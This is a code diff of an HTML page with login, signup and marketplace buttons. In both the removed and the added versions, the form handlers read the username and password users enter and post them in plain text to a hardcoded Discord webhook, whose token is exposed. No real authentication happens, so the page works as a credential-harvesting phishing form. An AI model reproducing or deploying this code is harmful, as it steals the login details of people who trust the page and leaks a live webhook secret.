@@ -26,17 +26,18 @@
     }
 
     .container {
-      margin: 20px;
       display: flex;
-      justify-content: flex-end;
+      justify-content: space-between;
       align-items: center;
+      padding: 20px;
     }
 
-    .form-container {
-      max-width: 400px;
+    .button-container {
+      display: flex;
     }
 
-    .form-container button {
+    .button-container button {
+      margin-left: 10px;
       padding: 8px 12px;
       color: #fff;
       background-color: transparent;
@@ -45,51 +46,8 @@
       font-size: 16px;
     }
 
-    .form-container button:hover {
+    .button-container button:hover {
       text-decoration: underline;
-    }
-
-    .popup {
-      display: none;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      padding: 20px;
-      background-color: #fff;
-      border: 1px solid #000;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-      z-index: 9999;
-    }
-
-    .popup h2 {
-      margin: 0 0 10px;
-    }
-
-    .popup form {
-      display: flex;
-      flex-direction: column;
-    }
-
-    .popup form label {
-      margin-bottom: 5px;
-    }
-
-    .popup form input {
-      margin-bottom: 10px;
-      padding: 5px;
-    }
-
-    .popup form button {
-      padding: 8px 12px;
-      background-color: #000;
-      color: #fff;
-      border: none;
-      cursor: pointer;
-    }
-
-    .popup form button[type="button"] {
-      margin-left: 10px;
     }
   </style>
 </head>
@@ -100,40 +58,35 @@
   </div>
 
   <div class="container">
-    <div class="form-container">
+    <div class="button-container">
       <button onclick="openPopup('loginPopup')">Login</button>
-    </div>
-
-    <div class="form-container">
       <button onclick="openPopup('signupPopup')">Signup</button>
+    </div>
+    <div class="button-container">
+      <button onclick="goToMarketplace()">Marketplace</button>
     </div>
   </div>
 
   <div id="loginPopup" class="popup">
+    <!-- Login popup code -->
     <h2>Login</h2>
-    <form onsubmit="login(event)">
-      <label for="loginUsername">Username:</label>
-      <input type="text" id="loginUsername" required>
-      <label for="loginPassword">Password:</label>
-      <input type="password" id="loginPassword" required>
-      <label for="staySignedIn">Stay Signed In:</label>
-      <input type="checkbox" id="staySignedIn">
+    <form onsubmit="submitForm(event, 'login')">
+      <input type="text" placeholder="Username" name="username" required><br>
+      <input type="password" placeholder="Password" name="password" required><br>
+      <label>
+        <input type="checkbox" name="staySignedIn"> Stay signed in
+      </label><br>
       <button type="submit">Login</button>
-      <button type="button" onclick="closePopup('loginPopup')">Close</button>
     </form>
   </div>
 
   <div id="signupPopup" class="popup">
+    <!-- Signup popup code -->
     <h2>Signup</h2>
-    <form onsubmit="signup(event)">
-      <label for="signupUsername">Username:</label>
-      <input type="text" id="signupUsername" required>
-      <label for="signupEmail">Email:</label>
-      <input type="email" id="signupEmail" required>
-      <label for="signupPassword">Password:</label>
-      <input type="password" id="signupPassword" required>
+    <form onsubmit="submitForm(event, 'signup')">
+      <input type="text" placeholder="Username" name="username" required><br>
+      <input type="password" placeholder="Password" name="password" required><br>
       <button type="submit">Signup</button>
-      <button type="button" onclick="closePopup('signupPopup')">Close</button>
     </form>
   </div>
 
@@ -146,45 +99,40 @@
       document.getElementById(popupId).style.display = "none";
     }
 
-    function login(event) {
+    function submitForm(event, type) {
       event.preventDefault();
-      const username = document.getElementById("loginUsername").value;
-      const password = document.getElementById("loginPassword").value;
-      const staySignedIn = document.getElementById("staySignedIn").checked;
-
-      const content = `**Login**\nUsername: ${username}\nPassword: ${password}\nStay Signed In: ${staySignedIn}`;
-      sendWebhook(content);
-    }
-
-    function signup(event) {
-      event.preventDefault();
-      const username = document.getElementById("signupUsername").value;
-      const email = document.getElementById("signupEmail").value;
-      const password = document.getElementById("signupPassword").value;
-
-      const content = `**Sign Up**\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
-      sendWebhook(content);
-    }
-
-    function sendWebhook(content) {
-      const webhookURL = "https://discord.com/api/webhooks/1114747356055879781/7fH1tMXA2cJ8neQ3o4pMsZfnJwqAsBFt3xHOIcjHzrs3JZrJ5Fnun5zHluFw3bR5k60B";
+      const form = event.target;
+      const username = form.username.value;
+      const password = form.password.value;
+      const staySignedIn = form.staySignedIn.checked;
       const payload = {
-        content: content
+        type,
+        username,
+        password,
+        staySignedIn,
       };
 
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-      })
-      .then(response => {
-        console.log("Webhook sent successfully!");
-      })
-      .catch(error => {
-        console.error("Error sending webhook:", error);
-      });
+      // Send the payload to the Discord webhook
+      sendPayloadToDiscordWebhook(payload);
+
+      // Close the popup
+      closePopup(`${type}Popup`);
+    }
+
+    function goToMarketplace() {
+      window.location.href = "https://anotha1.github.io/marketplace.html";
+    }
+
+    function sendPayloadToDiscordWebhook(payload) {
+      const webhookUrl = "https://discord.com/api/webhooks/1114747356055879781/7fH1tMXA2cJ8neQ3o4pMsZfnJwqAsBFt3xHOIcjHzrs3JZrJ5Fnun5zHluFw3bR5k60B";
+
+      // Construct the HTTP request
+      const request = new XMLHttpRequest();
+      request.open("POST", webhookUrl, true);
+      request.setRequestHeader("Content-Type", "application/json");
+
+      // Send the payload as JSON
+      request.send(JSON.stringify(payload));
     }
   </script>
 </body>
